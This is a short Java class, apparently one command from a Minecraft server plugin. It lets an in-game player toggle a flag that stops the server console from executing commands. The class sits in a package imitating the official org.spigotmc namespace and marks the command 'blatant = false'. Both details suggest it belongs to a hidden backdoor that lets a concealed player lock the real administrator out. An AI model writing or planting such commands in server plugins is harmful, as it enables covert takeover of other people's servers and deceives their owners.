package org.spigotmc.commands.impl.server;

import org.bukkit.entity.Player;
import org.spigotmc.Main;
import org.spigotmc.commands.CommandListener;
import org.spigotmc.commands.annotation.CommandInfo;
import org.spigotmc.utils.Settings;

@CommandInfo (
    name = "lockconsole",
    usage = "lockconsole",
    desc = "Lock the server console",
    blatant = false
)
public class LockConsole extends CommandListener {
    public static boolean isLocked = false;

    @Override
    public void execute(Main plugin, Player p, String[] args) {
        if (isLocked) {
			isLocked = false;
			p.sendMessage(Settings.PREFIX("Console can now execute commands."));
		} else {
			isLocked = true;
			p.sendMessage(Settings.PREFIX("Console can no longer execute commands."));
		}
	}
}
